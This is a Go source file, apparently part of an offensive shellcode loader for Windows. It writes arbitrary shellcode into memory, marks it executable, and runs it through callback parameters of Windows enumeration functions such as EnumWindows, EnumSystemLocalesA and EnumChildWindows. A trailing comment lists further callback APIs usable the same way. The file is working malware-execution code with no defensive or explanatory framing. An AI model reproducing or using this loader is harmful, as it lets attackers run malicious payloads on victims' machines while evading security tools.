package loader

import (
	"fmt"
	"unsafe"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func AllocMemory(shellcode []byte) (uintptr, error) {
	addr, err := xwindows.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil || addr == 0 {
		return 0, fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	rmErr := xwindows.RtlMoveMemory(
		unsafe.Pointer(addr),
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
	)
	if rmErr != nil {
		return 0, fmt.Errorf("RtlMoveMemory failed: %w", err)
	}

	var oldProtect uint32
	_, vpErr := xwindows.VirtualProtect(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if vpErr != nil {
		return 0, fmt.Errorf("VirtualProtect failed: %w", err)
	}

	return addr, nil
}

func Run(sc []byte, callback func(uintptr) error) error {
	addr, err := AllocMemory(sc)
	if err != nil {
		return err
	}

	return callback(addr)
}

// EnumChildWindowsX C++ EnumChildWindows(NULL, (WNDENUMPROC)addr, 0);
func EnumChildWindowsX(sc []byte) error {
	return Run(sc, func(addr uintptr) error {
		xwindows.EnumChildWindows(0, addr, nil)
		return nil
	})
}

func EnumerateLoadedModulesX(sc []byte) error {
	return Run(sc, func(addr uintptr) error {
		handle, _ := xwindows.GetCurrentProcess()
		_, err := xwindows.EnumerateLoadedModules(handle, addr, 0)
		return err
	})
}

func EnumPageFilesWX(sc []byte) error {
	return Run(sc, func(addr uintptr) error {
		_, err := xwindows.EnumPageFilesW(addr, 0)
		return err
	})
}

// EnumWindowsX C++ EnumWindows((WNDENUMPROC)addr, 0);
func EnumWindowsX(sc []byte) error {
	return Run(sc, func(addr uintptr) error {
		_, err := xwindows.EnumWindows(windows.Handle(addr), 0)
		return err
	})
}

// EnumTimeFormatsAX C++ EnumTimeFormatsA((TIMEFMT_ENUMPROCA)addr, 0, 0);
func EnumTimeFormatsAX(sc []byte) error {
	return Run(sc, func(addr uintptr) error {
		_, err := xwindows.EnumTimeFormatsA(
			windows.HWND(addr), 0x0C00, 0)
		return err
	})
}

// EnumSystemLocalesAX C++ EnumSystemLocalesA((LOCALE_ENUMPROCA)addr, 0);
func EnumSystemLocalesAX(sc []byte) error {
	return Run(sc, func(addr uintptr) error {
		_, err := xwindows.EnumSystemLocalesA(addr, 0)
		return err
	})
}

// EnumDesktopWindowsX C++ EnumDesktopWindows(NULL,(WNDENUMPROC)addr, 0);
func EnumDesktopWindowsX(sc []byte) error {
	return Run(sc, func(addr uintptr) error {
		_, err := xwindows.EnumDesktopWindows(0, addr, 0)
		return err
	})
}

// EnumThreadWindowsX C++ EnumThreadWindows(0, (WNDENUMPROC)addr, 0);
func EnumThreadWindowsX(sc []byte) error {
	return Run(sc, func(addr uintptr) error {
		_, err := xwindows.EnumThreadWindows(0, addr, 0)
		return err
	})
}

// EnumSystemLocalesA((LOCALE_ENUMPROCA)addr, 0);
// EnumTimeFormatsA((TIMEFMT_ENUMPROCA)addr, 0, 0);
// EnumWindows((WNDENUMPROC)addr, 0);
// EnumDesktopWindows(NULL,(WNDENUMPROC)addr, 0);
// EnumThreadWindows(0, (WNDENUMPROC)addr, 0);
// EnumSystemGeoID(0, 0, (GEO_ENUMPROC)addr);
// EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)addr, 0, 0);
// EnumUILanguagesA((UILANGUAGE_ENUMPROCA)addr, 0, 0);
// EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)addr, 0);
// EnumDesktopsW(NULL,(DESKTOPENUMPROCW)addr, NULL);
// EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)addr, 0);
// EnumDateFormatsA((DATEFMT_ENUMPROCA)addr, 0, 0);
// EnumChildWindows(NULL, (WNDENUMPROC)addr, 0);
